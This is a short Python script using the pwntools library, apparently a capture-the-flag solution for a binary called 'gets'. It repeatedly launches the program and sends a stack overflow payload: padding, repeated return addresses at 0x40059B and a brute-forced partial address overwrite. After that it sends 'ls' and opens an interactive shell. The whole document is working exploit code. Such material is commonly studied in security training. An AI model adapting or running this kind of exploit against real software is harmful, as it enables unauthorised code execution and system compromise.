#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('./gets')

for i in range(0x1000):
	p = process('./gets', timeout=2)
	# gdb.attach(p)
	try:
		payload = flat(['A' * 0x18, 0x40059B])
		for j in range(2):
			payload += flat(['B' * 8 * 5, 0x40059B])
		payload += flat(['C' * 8 * 5 + '\x16\x02'])
		p.sendline(payload)
		p.sendline('ls')
		data = p.recv()
		print data
		p.interactive()
	except Exception as e:
		p.close()
		continue
